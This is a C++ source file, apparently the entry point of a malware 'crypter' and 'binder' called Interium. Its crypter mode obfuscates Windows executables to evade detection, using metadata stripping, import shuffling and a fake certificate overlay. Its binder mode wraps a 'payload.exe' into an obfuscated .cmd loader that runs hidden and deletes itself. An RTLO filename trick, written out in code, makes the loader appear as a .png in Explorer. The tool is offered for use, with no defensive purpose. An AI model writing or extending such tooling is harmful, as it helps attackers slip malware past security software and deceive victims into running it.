#include <iostream>
#include <string>
#include "pe.h"
#include "transforms.h"
#include "binder.h"

void printUsage(const char* prog) {
    std::cout << "Interium\n\n";
    std::cout << "Usage: " << prog << " [options]\n\n";
    std::cout << "Modes:\n";
    std::cout << "  --mode crypter     PE binary obfuscation (default)\n";
    std::cout << "  --mode binder      Generate obfuscated .cmd from .exe\n\n";
    std::cout << "Common Options:\n";
    std::cout << "  --file <path>      Input PE executable\n";
    std::cout << "  --output <path>    Output file\n";
    std::cout << "  --level <level>    Obfuscation level: low, mid, high (default: mid)\n";
    std::cout << "  --help             Show this help\n\n";
    std::cout << "Binder Options:\n";
    std::cout << "  --pe-level <l>     PE obfuscation level before embedding (default: mid)\n";
    std::cout << "  --no-pe-obf        Skip PE obfuscation (embed raw exe)\n";
    std::cout << "  --self-delete      .cmd deletes itself after execution\n";
    std::cout << "  --hidden           Run payload with hidden window\n";
    std::cout << "  --rtlo             Embed RTLO trick: file appears as .png in Explorer\n\n";
    std::cout << "Crypter Levels:\n";
    std::cout << "  low  - Metadata + Rich header cleanup only\n";
    std::cout << "  mid  - + Import shuffle, PE characteristic spoofing\n";
    std::cout << "  high - + Fake certificate overlay\n\n";
    std::cout << "Binder Levels:\n";
    std::cout << "  low  - Random variables, junk comments\n";
    std::cout << "  mid  - + String atomization, delayed expansion\n";
    std::cout << "  high - + Goto spaghetti, control flow obfuscation\n\n";
    std::cout << "Examples:\n";
    std::cout << "  " << prog << " --mode crypter --file payload.exe --level mid\n";
    std::cout << "  " << prog << " --mode binder --file payload.exe --output loader.cmd --level high\n";
    std::cout << "  " << prog << " --mode binder --file payload.exe --level high --self-delete --hidden\n";
}

Interium::Level parseLevel(const std::string& s) {
    if (s == "low")  return Interium::Level::LOW;
    if (s == "high") return Interium::Level::HIGH;
    return Interium::Level::MID; // default
}

int runCrypter(const std::string& inputFile, const std::string& outputFile, Interium::Level level) {
    Interium::PEFile pe;
    if (!pe.load(inputFile)) {
        std::cerr << "Failed to load PE: " << inputFile << "\n";
        return 1;
    }

    std::cout << "Loaded PE (" << pe.data().size() << " bytes, "
              << (pe.is64bit() ? "x64" : "x86") << ")\n";
    std::cout << "Sections: " << pe.s_Count()
              << " | Entry: 0x" << std::hex << pe.entryPoint() << std::dec << "\n";
    std::cout << "Rich header: " << (pe.hasRichHeader() ? "yes" : "no") << "\n\n";

    Interium::Stats stats;

    std::cout << "Cleaning metadata...\n";
    Interium::cleanMetadata(pe, stats);

    std::cout << "Cleaning Rich header...\n";
    Interium::cleanRichHeader(pe, stats);

    std::cout << "Restoring standard DOS stub...\n";
    Interium::killDosStub(pe, stats);

    std::cout << "Renaming non-standard sections...\n";
    Interium::renameSections(pe, stats);

    if (level >= Interium::Level::MID) {
        std::cout << "Spoofing PE...\n";
        Interium::spoofPECharacteristics(pe, stats);

        std::cout << "Shuffling import...\n";
        Interium::shuffleImports(pe, stats);
    }

    if (level >= Interium::Level::HIGH) {
        std::cout << "Adding fake cert overlay...\n";
        Interium::addOverlay(pe, level, stats);
    }

    std::cout << "Fixing PE checksum...\n";
    Interium::fixChecksum(pe);

    if (!pe.save(outputFile)) {
        std::cerr << "Failed to save: " << outputFile << "\n";
        return 1;
    }

    std::cout << "\nStats:\n";
    std::cout << "    Metadata cleaned:   " << stats.metadataCleaned << "\n";
    std::cout << "    Sections renamed:   " << stats.sectionsRenamed << "\n";
    std::cout << "    Imports shuffled:   " << stats.importsHidden << "\n";
    std::cout << "    Overlay added:      " << stats.junkBytesAdded << " bytes\n";
    std::cout << "\nSaved: " << outputFile << " (" << pe.data().size() << " bytes)\n";
    std::cout << "Done!\n";

    return 0;
}

int runBinder(const Interium::BinderConfig& cfg) {
    std::cout << "Interium\n";
    std::cout << "Input:     " << cfg.i_Exe << "\n";
    std::cout << "Output:    " << cfg.o_Cmd << "\n";
    std::cout << "Bat level: " << (cfg.batLevel == Interium::Level::LOW ? "low" : cfg.batLevel == Interium::Level::MID ? "mid" : "high") << "\n";
    std::cout << "PE obf:    " << (cfg.a_PeObf ? "yes" : "no") << "\n";
    std::cout << "Hidden:    " << (cfg.h_Exec ? "yes" : "no") << "\n";
    std::cout << "Self-del:  " << (cfg.s_Del ? "yes" : "no") << "\n\n";

    if (!Interium::g_Cmd(cfg)) {
        std::cerr << "Binder failed!\n";
        return 1;
    }

    std::cout << "Done!\n";
    return 0;
}

int main(int argc, char* argv[]) {
    std::string mode = "crypter";
    std::string inputFile, outputFile;
    std::string levelStr = "mid", peLevelStr = "mid";
    bool sDel = false, hidden = false, noPeObf = false, rtlo = false;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--help" || arg == "-h") { printUsage(argv[0]); return 0; }
        else if (arg == "--mode" && i + 1 < argc) mode = argv[++i];
        else if (arg == "--file" && i + 1 < argc) inputFile = argv[++i];
        else if (arg == "--output" && i + 1 < argc) outputFile = argv[++i];
        else if (arg == "--level" && i + 1 < argc) levelStr = argv[++i];
        else if (arg == "--pe-level" && i + 1 < argc) peLevelStr = argv[++i];
        else if (arg == "--self-delete") sDel = true;
        else if (arg == "--hidden") hidden = true;
        else if (arg == "--no-pe-obf") noPeObf = true;
        else if (arg == "--rtlo") rtlo = true;
    }

    if (inputFile.empty()) {
        std::cerr << "Error: No input file.\n\n";
        printUsage(argv[0]);
        return 1;
    }

    Interium::Level level = parseLevel(levelStr);

    if (mode == "binder") {
        if (outputFile.empty()) {
            size_t dot = inputFile.rfind('.');
            if (dot != std::string::npos)
                outputFile = inputFile.substr(0, dot) + ".cmd";
            else
                outputFile = inputFile + ".cmd";
        }

        if (rtlo) {
            const std::string rtlo_char = "\xE2\x80\xAE";
            size_t dot = outputFile.rfind('.');
            std::string base = (dot != std::string::npos) ? outputFile.substr(0, dot) : outputFile;
            outputFile = base + rtlo_char + "gnp.cmd";
            std::cout << "RTLO trick enabled\n";
            std::cout << "Disk filename : " << base << "<RTLO>gnp.cmd\n";
            std::cout << "Explorer shows: " << base << "dmc.png\n";
        }

        Interium::BinderConfig cfg;
        cfg.i_Exe = inputFile;
        cfg.o_Cmd = outputFile;
        cfg.batLevel = level;
        cfg.peLevel = parseLevel(peLevelStr);
        cfg.s_Del = sDel;
        cfg.h_Exec = hidden;
        cfg.a_PeObf = !noPeObf;

        return runBinder(cfg);
    } else {
        if (outputFile.empty()) {
            size_t dot = inputFile.rfind('.');
            if (dot != std::string::npos)
                outputFile = inputFile.substr(0, dot) + "_obf.exe";
            else
                outputFile = inputFile + "_obf.exe";
        }

        std::cout << "Interium - PE Binary Obfuscator\n";
        std::cout << "Input:  " << inputFile << "\n";
        std::cout << "Output: " << outputFile << "\n";
        std::cout << "Level:  " << levelStr << "\n\n";

        return runCrypter(inputFile, outputFile, level);
    }
}
